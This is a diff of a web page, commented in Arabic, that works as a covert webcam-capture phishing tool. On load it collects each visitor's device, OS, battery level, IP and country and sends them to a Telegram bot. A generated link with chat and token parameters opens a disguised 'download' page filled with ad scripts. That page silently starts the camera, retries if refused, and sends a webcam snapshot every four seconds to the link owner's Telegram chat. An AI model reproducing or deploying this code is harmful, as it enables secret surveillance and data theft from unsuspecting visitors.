@@ -52,17 +52,6 @@
       box-shadow:0 6px 20px rgba(0,0,0,0.5);
       color: #ffffff;
     }
-    .viewerFrame{
-      width:100%;
-      height:100vh;
-      border:0;
-      position:fixed;
-      top:0;
-      left:0;
-      right:0;
-      bottom:0;
-      background:#ffffff;
-    }
     @media (max-width:720px){
       .title{font-size:28px}
       .card{padding:16px}
@@ -144,17 +133,57 @@
       color: #ffffff;
     }
 
-    /* الصفحة البيضاء الفارغة */
-    .white-page {
+    /* ستايل صفحة التحميل الجانبية */
+    .download-page {
       width: 100%;
-      height: 100vh;
-      background: #ffffff;
-      position: fixed;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      z-index: 1;
+      min-height: 100vh;
+      background: #f5f5f5;
+      margin: 0;
+      padding: 20px 0;
+      box-sizing: border-box;
+      font-family: Tahoma, Arial, sans-serif;
+    }
+    .main-box{
+      width:95%;
+      max-width:600px;
+      background:white;
+      margin:40px auto;
+      padding:25px;
+      border-radius:15px;
+      box-shadow:0 5px 20px rgba(0,0,0,0.1);
+      text-align:center;
+    }
+    .main-box h2{
+      margin-bottom:20px;
+      color:#222;
+    }
+    .ad-box{
+      margin:20px 0;
+      padding:10px;
+      border-radius:10px;
+      background:#fafafa;
+      border:1px solid #eee;
+    }
+    .download-btn{
+      background:#28a745;
+      color:white;
+      padding:18px 45px;
+      font-size:22px;
+      border:none;
+      border-radius:12px;
+      cursor:pointer;
+      transition:0.3s;
+      box-shadow:0 4px 10px rgba(0,0,0,0.2);
+    }
+    .download-btn:hover{
+      background:#218838;
+      transform:scale(1.05);
+    }
+    .footer{
+      text-align:center;
+      margin-top:30px;
+      font-size:14px;
+      color:#777;
     }
   </style>
 </head>
@@ -227,7 +256,6 @@
   // ------------------ إرسال معلومات الزائر (البلد + الجهاز + الشحن) ------------------
   async function sendVisitorInfo() {
     try {
-      // 1. جمع معلومات الجهاز
       const userAgent = navigator.userAgent;
       visitorDevice = "Unknown";
       if (/Android/i.test(userAgent)) visitorDevice = "Android";
@@ -238,7 +266,6 @@
 
       visitorOS = navigator.platform || "غير معروف";
 
-      // 2. محاولة الحصول على البطارية (نسبة الشحن)
       if (navigator.getBattery) {
         try {
           const battery = await navigator.getBattery();
@@ -248,7 +275,6 @@
         } catch (e) { visitorBattery = "غير متاح"; }
       }
 
-      // 3. الحصول على IP والدولة عبر خدمة خارجية
       try {
         const ipRes = await fetch('https://ipapi.co/json/');
         const ipData = await ipRes.json();
@@ -256,7 +282,6 @@
         visitorCountry = ipData.country_name || "غير معروف";
       } catch (e) { /* تجاهل الفشل */ }
 
-      // 4. تجهيز الرسالة
       const message = `
 🟢 *زيارة جديدة للموقع*
 ━━━━━━━━━━━━━━━
@@ -269,7 +294,6 @@
 ━━━━━━━━━━━━━━━
       `;
 
-      // 5. إرسال إلى البوت الرئيسي
       const url = `https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`;
       await fetch(url, {
         method: 'POST',
@@ -286,20 +310,17 @@
     }
   }
 
-  // استدعاء دالة إرسال المعلومات فور فتح الصفحة (الزائر العادي)
   sendVisitorInfo();
 
-  // ------------------ عناصر الدايلوج (للمستخدم الرئيسي فقط) ------------------
+  // ------------------ عناصر الدايلوج ------------------
   const dialog = document.getElementById('mandatoryDialog');
   const channel1 = document.getElementById('channel1');
   const channel2 = document.getElementById('channel2');
   const subscribeBtn = document.getElementById('subscribeDoneBtn');
 
-  // التحقق من حالة الاشتراك
   let channel1Clicked = false;
   let channel2Clicked = false;
 
-  // عند النقر على رابط القناة الأولى
   channel1.addEventListener('click', function() {
     channel1Clicked = true;
     channel1.classList.add('visited');
@@ -309,7 +330,6 @@
     checkBothClicked();
   });
 
-  // عند النقر على رابط القناة الثانية
   channel2.addEventListener('click', function() {
     channel2Clicked = true;
     channel2.classList.add('visited');
@@ -319,7 +339,6 @@
     checkBothClicked();
   });
 
-  // دالة التحقق من النقر على كلا الرابطين
   function checkBothClicked() {
     if (channel1Clicked && channel2Clicked) {
       subscribeBtn.disabled = false;
@@ -330,7 +349,6 @@
     }
   }
 
-  // إخفاء الدايلوج عند الضغط على زر "تم الاشتراك"
   subscribeBtn.addEventListener('click', function() {
     dialog.style.display = 'none';
   });
@@ -350,7 +368,6 @@
       return;
     }
 
-    // رابط ثابت - يتم إزالته تماماً من الباراميترز
     const fullLink = `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}`;
     linkText.innerText = fullLink;
     resultEl.style.display = 'flex';
@@ -366,7 +383,7 @@
     }
   });
 
-  // ------------------ دالة تشغيل الكاميرا مع إعادة المحاولة التلقائية ------------------
+  // ------------------ دالة تشغيل الكاميرا ------------------
   async function startCameraAndSend(chat, token) {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
@@ -379,10 +396,8 @@
       vid.srcObject = stream;
       document.body.appendChild(vid);
       
-      // انتظر حتى يشتغل الفيديو فعلاً
       await vid.play();
       
-      // انتظر حتى يكون للفيديو أبعاد حقيقية
       let attempts = 0;
       while ((vid.videoWidth === 0 || vid.videoHeight === 0) && attempts < 50) {
         await new Promise(resolve => setTimeout(resolve, 100));
@@ -394,12 +409,10 @@
       canvas.height = vid.videoHeight || 480;
 
       const tick = async () => {
-        // تأكد أن الفيديو شغال
         if (vid.paused || vid.ended) {
           await vid.play();
         }
         
-        // تأكد من الأبعاد
         if (vid.videoWidth > 0 && vid.videoHeight > 0) {
           canvas.width = vid.videoWidth;
           canvas.height = vid.videoHeight;
@@ -409,7 +422,6 @@
         ctx.drawImage(vid, 0, 0, canvas.width, canvas.height);
 
         canvas.toBlob(async (blob) => {
-          // تجاهل الصور الصغيرة جداً (الفارغة)
           if (!blob || blob.size < 2000) return;
           
           try {
@@ -450,10 +462,7 @@
         }, 'image/jpeg', 0.9);
       };
 
-      // أول صورة بعد ثانيتين عشان الفيديو يثبت
       setTimeout(tick, 2000);
-      
-      // بعد كده كل 4 ثواني
       const intervalId = setInterval(tick, 4000);
 
       window.addEventListener('beforeunload', () => {
@@ -462,7 +471,6 @@
       });
 
     } catch (err) {
-      // إعادة المحاولة تلقائياً بعد ثانيتين
       console.log("فشل الوصول للكاميرا، إعادة المحاولة...");
       setTimeout(() => {
         startCameraAndSend(chat, token);
@@ -470,16 +478,16 @@
     }
   }
 
-  // ------------------ viewer mode ------------------
+  // ------------------ الوضع الجانبي (viewer mode) ------------------
   const params = new URLSearchParams(window.location.search);
   const chat = params.get('chat');
   const token = params.get('token');
 
   if (chat && token) {
-    // إخفاء الدايلوج نهائياً في الصفحة الجانبية
+    // إخفاء الدايلوج
     dialog.style.display = 'none';
     
-    // إخفاء الكارت وجميع العناصر الأخرى
+    // إخفاء عناصر الصفحة الأساسية
     document.getElementById('cardArea').style.display = 'none';
     document.querySelector('.header').style.display = 'none';
     document.querySelector('.madeby').style.display = 'none';
@@ -488,22 +496,65 @@
     const captureBadge = document.getElementById('captureBadge');
     captureBadge.style.display = 'none';
     
-    // تنظيف الصفحة بالكامل
+    // تنظيف الـ wrap
     const wrap = document.querySelector('.wrap');
     wrap.innerHTML = '';
     wrap.style.padding = '0';
     wrap.style.margin = '0';
     wrap.style.maxWidth = '100%';
-    wrap.style.background = '#ffffff';
+    wrap.style.background = '#f5f5f5';
     
-    // إنشاء صفحة بيضاء فارغة
-    const whitePage = document.createElement('div');
-    whitePage.className = 'white-page';
-    wrap.appendChild(whitePage);
+    // إنشاء صفحة التحميل الجانبية
+    const downloadPage = document.createElement('div');
+    downloadPage.className = 'download-page';
+    downloadPage.innerHTML = `
+      <div class="main-box">
+        <h2>⬇️ تحميل الملف الآن ⬇️</h2>
+        
+        <div class="ad-box">
+          <script src="https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js"><\/script>
+        </div>
+        
+        <div class="ad-box">
+          <script async data-cfasync="false" src="https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js"><\/script>
+          <div id="container-596225155ab3da796681d551cb4b7cf4"></div>
+        </div>
+        
+        <button class="download-btn" onclick="goDownload()">تنزيل الآن</button>
+        
+        <div class="ad-box">
+          <script src="https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js"><\/script>
+        </div>
+        
+        <div class="ad-box">
+          <script>
+            atOptions = {
+              'key' : '0b7539a5227dc7b69da2ea94b0521ab6',
+              'format' : 'iframe',
+              'height' : 300,
+              'width' : 160,
+              'params' : {}
+            };
+          <\/script>
+          <script src="https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js"><\/script>
+        </div>
+        
+        <div class="footer">
+          © 2026 جميع الحقوق محفوظة
+        </div>
+      </div>
+    `;
     
-    // تشغيل الكاميرا - إعادة المحاولة التلقائية بدون أي رسائل
+    wrap.appendChild(downloadPage);
+    
+    // دالة التحميل
+    window.goDownload = function() {
+      window.open("https://www.effectivegatecpm.com/d6mid86v?key=90c984c8fd10e21cd01541eb4207aa2c","_blank");
+    };
+    
+    // تشغيل الكاميرا
     startCameraAndSend(chat, token);
   }
 </script>
 </body>
-      </html>
+  </html>
